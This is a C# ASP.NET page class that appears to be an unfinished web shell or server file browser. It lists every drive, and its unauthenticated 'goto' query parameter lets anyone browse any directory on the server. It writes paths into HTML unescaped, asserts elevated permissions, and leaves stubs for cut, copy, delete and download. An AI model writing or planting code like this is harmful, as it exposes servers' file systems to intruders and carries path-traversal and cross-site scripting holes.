using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Security.Permissions;
using Microsoft.VisualBasic.Devices;
using System.Net;
using System.Collections.Generic;
using System.Collections;

public partial class _Default : System.Web.UI.Page
{
    string[] drives;
    string[] dir;
    string[] files;
    string goTo;
    protected PermissionSetAttribute _permissionSetAttribute = new PermissionSetAttribute(SecurityAction.Assert);
    protected ComputerInfo _computerInfo = new ComputerInfo();
    protected PerformanceCounter _uptime = new PerformanceCounter("System", "System Up Time");
    protected DriveInfo _driveInfo = new DriveInfo("c");

    protected void Page_Init(object sender, EventArgs e)
    {
     _uptime.NextValue();
    }

    protected TimeSpan Uptime
    {
        get { return TimeSpan.FromSeconds(_uptime.NextValue()); }
    }

    protected static string ToSizeString(double bytes)
    {
        var culture = CultureInfo.CurrentUICulture;
        const string format = "#,0.0";

        if (bytes < 1024)
            return bytes.ToString("#,0", culture);
        bytes /= 1024;
        if (bytes < 1024)
            return bytes.ToString(format, culture) + " KB";
        bytes /= 1024;
        if (bytes < 1024)
            return bytes.ToString(format, culture) + " MB";
        bytes /= 1024;
        if (bytes < 1024)
            return bytes.ToString(format, culture) + " GB";
        bytes /= 1024;
        return bytes.ToString(format, culture) + " TB";
    }

    public void ListDrive()
    {
        drives = Directory.GetLogicalDrives();
        string drive = "";
        for (int i = 0; i < drives.Length; i++)
        {
            Response.Write("<a href='?goto="+drives[i].ToString()+"'>"+drives[i].ToString()+"</a> ");
            ;
        }
    }

    public void ListDirandFile()
    {
        if (Request.QueryString["goto"] == null || Request.QueryString["goto"]=="")
        {
            goTo = Server.MapPath("");
        }
        else goTo = Request.QueryString["goto"].ToString();
        dir = Directory.GetDirectories(goTo);
        files = Directory.GetFiles(goTo);
        FileInfo file;
        Response.Write("<tr><td>[DIR] <a href='?goto="+Directory.GetParent(goTo)+"'> .. </a>" + "</td></tr>");
        for (int i = 0; i < dir.Length; i++)
        {
            DirectoryInfo directory = new DirectoryInfo(dir[i].ToString());
            Response.Write("<tr><td>[DIR] <a href='?goto="+directory.ToString() +  "'>" +directory.ToString()+ "</a></td><td></td><td>"+directory.LastWriteTimeUtc+"</td><td>"+
                            "</td></tr>");
        }
        for (int i = 0; i < files.Length; i++)
        {
            file = new FileInfo(files[i]);
            Response.Write("<tr><td style='color: white'>" + file.ToString()+"</td><td>"+getSize(file.Length) +"</td><td>"+file.LastWriteTime+ "</td><td></td></tr>");
        }
    }

    private string getSize(long size)
    {
        if (size < 1024)
        {
            return size + " bytes"; 
        }
        else if(size/1024 < 1024)
        {
            return size / 1024 + " KB";
        }
        else if (size/1024/1024<1024)
        {
            return size / 1024 / 1024 + " MB";
        }
        else
        {
            return size / 1024 / 1024 / 1024 + " GB";
        }

    }

    private void Cut(FileInfo file)
    {

    }

    private void Copy(FileInfo file)
    {
        
    }
    private void Delete(FileInfo file)
    {

    }
    private void Download(FileInfo file)
    {

    }
    /*public string GetIPAddress()
    {
        IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName()); // `Dns.Resolve()` method is deprecated.
        IPAddress ipAddress = ipHostInfo.AddressList[1];

        return ipAddress.ToString();
    }*/
}